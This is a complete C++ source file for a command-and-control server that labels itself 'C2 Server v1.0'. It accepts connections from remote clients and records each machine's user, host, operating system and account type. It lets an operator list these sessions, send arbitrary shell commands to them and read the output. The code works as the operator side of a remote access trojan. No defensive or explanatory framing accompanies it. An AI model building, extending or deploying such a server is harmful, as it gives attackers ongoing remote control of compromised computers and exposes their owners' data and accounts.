#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <cstdint>
#include <map>
#include <algorithm>
#include <iomanip>
#include <sstream>
#include <ctime>
#include <thread>
#include <atomic>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef SOCKET sock_t;
    #define CLOSE_SOCKET closesocket
    #define SHUT_RDWR SD_BOTH
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <sys/select.h>
    #include <sys/time.h>
    #include <sys/types.h>
    #include <fcntl.h>
    typedef int sock_t;
    #define CLOSE_SOCKET close
    #define SHUT_RDWR SHUT_RDWR
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
#endif

const int PORT = 8080;
const int BUFFER_SIZE = 4096;
const int MAX_CLIENTS = 100;
const std::string SERVER_VERSION = "1.0";

struct Session {
    sock_t sock;
    std::string ip_address;
    std::string current_dir;
    std::string tag;
    std::string user_pc;
    std::string version;
    std::string status;
    std::string user_status;
    std::string os;
    std::string account_type;
    time_t connect_time;
};

std::map<int, Session> sessions;
int session_counter = 0;
int current_session = -1;
std::atomic<bool> server_running(true);

bool send_all(sock_t sock, const char* buf, size_t len) {
    while (len > 0) {
        int sent = send(sock, buf, len, 0);
        if (sent <= 0) return false;
        buf += sent;
        len -= sent;
    }
    return true;
}

bool recv_all(sock_t sock, char* buf, size_t len) {
    while (len > 0) {
        int received = recv(sock, buf, len, 0);
        if (received <= 0) return false;
        buf += received;
        len -= received;
    }
    return true;
}

std::string get_client_ip(sockaddr_in client_addr) {
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr.sin_addr), ip, INET_ADDRSTRLEN);
    return std::string(ip);
}

std::string format_duration(time_t seconds) {
    int minutes = seconds / 60;
    int secs = seconds % 60;
    std::stringstream ss;
    ss << minutes << "m " << secs << "s";
    return ss.str();
}

void list_sessions() {
    std::cout << "\nSession List:\n";
    std::cout << std::left 
              << std::setw(5) << "ID"
              << std::setw(16) << "IP Address"
              << std::setw(10) << "Tag"
              << std::setw(25) << "User@PC"
              << std::setw(10) << "Version"
              << std::setw(15) << "Status"
              << std::setw(15) << "User Status"
              << std::setw(20) << "Operating System"
              << std::setw(15) << "Account Type" << std::endl;
    
    std::cout << std::string(130, '-') << std::endl;
    
    for (const auto& [id, session] : sessions) {
        if (session.status == "Disconnected") continue;
        
        time_t now = time(nullptr);
        time_t duration = now - session.connect_time;
        std::string status = session.status + " (" + format_duration(duration) + ")";
        
        // Truncate long fields to prevent overflow
        std::string user_pc = session.user_pc;
        if (user_pc.length() > 24) user_pc = user_pc.substr(0, 22) + "..";
        
        std::string os = session.os;
        if (os.length() > 19) os = os.substr(0, 17) + "..";
        
        std::cout << std::left 
                  << std::setw(5) << id
                  << std::setw(16) << session.ip_address
                  << std::setw(10) << session.tag
                  << std::setw(25) << user_pc
                  << std::setw(10) << session.version
                  << std::setw(15) << status
                  << std::setw(15) << session.user_status
                  << std::setw(20) << os
                  << std::setw(15) << session.account_type << std::endl;
    }
    std::cout << std::endl;
}

void disconnect_session(int session_id) {
    if (sessions.find(session_id) == sessions.end()) {
        std::cout << "Invalid session ID\n";
        return;
    }
    
    Session& session = sessions[session_id];
    if (session.status == "Disconnected") {
        std::cout << "Session already disconnected\n";
        return;
    }
    
    std::string cmd = "disconnect";
    uint32_t cmd_len = htonl(static_cast<uint32_t>(cmd.size()));
    send_all(session.sock, reinterpret_cast<const char*>(&cmd_len), sizeof(cmd_len));
    send_all(session.sock, cmd.c_str(), cmd.size());
    
    shutdown(session.sock, SHUT_RDWR);
    CLOSE_SOCKET(session.sock);
    session.status = "Disconnected";
    std::cout << "Session " << session_id << " disconnected\n";
    
    if (current_session == session_id) {
        current_session = -1;
    }
}

void interactive_session(int session_id) {
    if (sessions.find(session_id) == sessions.end()) {
        std::cout << "Invalid session ID\n";
        return;
    }
    
    Session& session = sessions[session_id];
    if (session.status == "Disconnected") {
        std::cout << "Session is disconnected\n";
        return;
    }
    
    current_session = session_id;
    std::cout << "Entering session " << session_id << " (" << session.user_pc << ")\n";
    std::cout << "Type 'exit' to leave session\n\n";
    
    while (true) {
        // Display prompt
        std::cout << session.current_dir << "> ";
        std::string cmd;
        std::getline(std::cin, cmd);
        
        if (cmd == "exit") {
            current_session = -1;
            std::cout << "Left session " << session_id << "\n";
            return;
        }
        
        // Send command
        uint32_t cmd_len = htonl(static_cast<uint32_t>(cmd.size()));
        if (!send_all(session.sock, reinterpret_cast<const char*>(&cmd_len), sizeof(cmd_len))) {
            std::cout << "Connection lost with session " << session_id << "\n";
            session.status = "Disconnected";
            current_session = -1;
            return;
        }
        if (!send_all(session.sock, cmd.c_str(), cmd.size())) {
            std::cout << "Connection lost with session " << session_id << "\n";
            session.status = "Disconnected";
            current_session = -1;
            return;
        }
        
        // Receive directory
        uint32_t dir_len;
        if (!recv_all(session.sock, reinterpret_cast<char*>(&dir_len), sizeof(dir_len))) {
            std::cout << "Connection lost with session " << session_id << "\n";
            session.status = "Disconnected";
            current_session = -1;
            return;
        }
        dir_len = ntohl(dir_len);
        
        std::vector<char> dir_buf(dir_len + 1, 0);
        if (!recv_all(session.sock, dir_buf.data(), dir_len)) {
            std::cout << "Connection lost with session " << session_id << "\n";
            session.status = "Disconnected";
            current_session = -1;
            return;
        }
        session.current_dir = std::string(dir_buf.data(), dir_len);
        
        // Receive output
        uint32_t output_len;
        if (!recv_all(session.sock, reinterpret_cast<char*>(&output_len), sizeof(output_len))) {
            std::cout << "Connection lost with session " << session_id << "\n";
            session.status = "Disconnected";
            current_session = -1;
            return;
        }
        output_len = ntohl(output_len);
        
        if (output_len > 0) {
            std::vector<char> output(output_len + 1, 0);
            if (!recv_all(session.sock, output.data(), output_len)) {
                std::cout << "Connection lost with session " << session_id << "\n";
                session.status = "Disconnected";
                current_session = -1;
                return;
            }
            std::cout << output.data() << std::endl;
        }
    }
}

void handle_command(const std::string& command) {
    std::istringstream iss(command);
    std::string cmd;
    iss >> cmd;
    
    if (cmd == "sessions") {
        list_sessions();
    }
    else if (cmd == "session") {
        int session_id;
        if (iss >> session_id) {
            interactive_session(session_id);
        } else {
            std::cout << "Usage: session <id>\n";
        }
    }
    else if (cmd == "disconnect") {
        int session_id;
        if (iss >> session_id) {
            disconnect_session(session_id);
        } else {
            std::cout << "Usage: disconnect <id>\n";
        }
    }
    else if (cmd == "help") {
        std::cout << "\nAvailable commands:\n";
        std::cout << "  sessions          - List all active sessions\n";
        std::cout << "  session <id>      - Interact with a session\n";
        std::cout << "  disconnect <id>   - Disconnect a session\n";
        std::cout << "  help              - Show this help\n";
        std::cout << "  exit              - Shutdown the server\n\n";
    }
    else if (cmd == "exit") {
        for (auto& [id, session] : sessions) {
            if (session.status != "Disconnected") {
                disconnect_session(id);
            }
        }
        server_running = false;
    }
    else {
        std::cout << "Unknown command. Type 'help' for available commands.\n";
    }
}

void input_thread() {
    while (server_running) {
        std::string command;
        std::getline(std::cin, command);
        if (!command.empty()) {
            handle_command(command);
        }
    }
}

int main() {
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed\n";
            return 1;
        }
    #endif

    sock_t server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }

    #ifdef _WIN32
        unsigned long mode = 1;
        ioctlsocket(server_fd, FIONBIO, &mode);
    #else
        int flags = fcntl(server_fd, F_GETFL, 0);
        fcntl(server_fd, F_SETFL, flags | O_NONBLOCK);
    #endif

    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr("127.0.0.1");
    address.sin_port = htons(PORT);

    if (bind(server_fd, (sockaddr*)&address, sizeof(address)) < 0) {
        std::cerr << "Bind failed\n";
        CLOSE_SOCKET(server_fd);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }

    if (listen(server_fd, MAX_CLIENTS) < 0) {
        std::cerr << "Listen failed\n";
        CLOSE_SOCKET(server_fd);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }

    std::cout << "C2 Server v" << SERVER_VERSION << " listening on 127.0.0.1:" << PORT << std::endl;
    std::cout << "Type 'help' for available commands\n\n";

    // Start input handling thread
    std::thread input_handler(input_thread);
    input_handler.detach();

    while (server_running) {
        sockaddr_in client_addr;
        #ifdef _WIN32
            int addrlen = sizeof(client_addr);
        #else
            socklen_t addrlen = sizeof(client_addr);
        #endif
        
        sock_t client_fd = accept(server_fd, (sockaddr*)&client_addr, &addrlen);
        if (client_fd != INVALID_SOCKET) {
            #ifdef _WIN32
                mode = 0;
                ioctlsocket(client_fd, FIONBIO, &mode);
            #else
                flags = fcntl(client_fd, F_GETFL, 0);
                fcntl(client_fd, F_SETFL, flags & ~O_NONBLOCK);
            #endif
            
            std::string client_ip = get_client_ip(client_addr);
            
            Session new_session;
            new_session.sock = client_fd;
            new_session.ip_address = client_ip;
            new_session.connect_time = time(nullptr);
            new_session.status = "Active";
            
            // Receive initial directory
            uint32_t dir_len;
            if (recv_all(client_fd, reinterpret_cast<char*>(&dir_len), sizeof(dir_len))) {
                dir_len = ntohl(dir_len);
                std::vector<char> dir_buf(dir_len + 1, 0);
                if (recv_all(client_fd, dir_buf.data(), dir_len)) {
                    new_session.current_dir = std::string(dir_buf.data(), dir_len);
                }
            }
            
            // Receive client version
            uint32_t version_len;
            if (recv_all(client_fd, reinterpret_cast<char*>(&version_len), sizeof(version_len))) {
                version_len = ntohl(version_len);
                std::vector<char> version_buf(version_len + 1, 0);
                if (recv_all(client_fd, version_buf.data(), version_len)) {
                    new_session.version = std::string(version_buf.data(), version_len);
                }
            }
            
            // Receive session info
            uint32_t field_len;
            if (recv_all(client_fd, reinterpret_cast<char*>(&field_len), sizeof(field_len))) {
                field_len = ntohl(field_len);
                std::vector<char> tag_buf(field_len + 1, 0);
                if (recv_all(client_fd, tag_buf.data(), field_len)) {
                    new_session.tag = std::string(tag_buf.data(), field_len);
                }
            }
            
            if (recv_all(client_fd, reinterpret_cast<char*>(&field_len), sizeof(field_len))) {
                field_len = ntohl(field_len);
                std::vector<char> user_buf(field_len + 1, 0);
                if (recv_all(client_fd, user_buf.data(), field_len)) {
                    new_session.user_pc = std::string(user_buf.data(), field_len);
                }
            }
            
            if (recv_all(client_fd, reinterpret_cast<char*>(&field_len), sizeof(field_len))) {
                field_len = ntohl(field_len);
                std::vector<char> status_buf(field_len + 1, 0);
                if (recv_all(client_fd, status_buf.data(), field_len)) {
                    new_session.user_status = std::string(status_buf.data(), field_len);
                }
            }
            
            if (recv_all(client_fd, reinterpret_cast<char*>(&field_len), sizeof(field_len))) {
                field_len = ntohl(field_len);
                std::vector<char> os_buf(field_len + 1, 0);
                if (recv_all(client_fd, os_buf.data(), field_len)) {
                    new_session.os = std::string(os_buf.data(), field_len);
                }
            }
            
            if (recv_all(client_fd, reinterpret_cast<char*>(&field_len), sizeof(field_len))) {
                field_len = ntohl(field_len);
                std::vector<char> account_buf(field_len + 1, 0);
                if (recv_all(client_fd, account_buf.data(), field_len)) {
                    new_session.account_type = std::string(account_buf.data(), field_len);
                }
            }
            
            sessions[session_counter] = new_session;
            std::cout << "New session " << session_counter << " from " << client_ip 
                      << " (" << new_session.user_pc << ")\n";
            session_counter++;
        }
        
        #ifdef _WIN32
            Sleep(10);
        #else
            usleep(10000);
        #endif
    }

    CLOSE_SOCKET(server_fd);

    #ifdef _WIN32
        WSACleanup();
    #endif

    return 0;
}
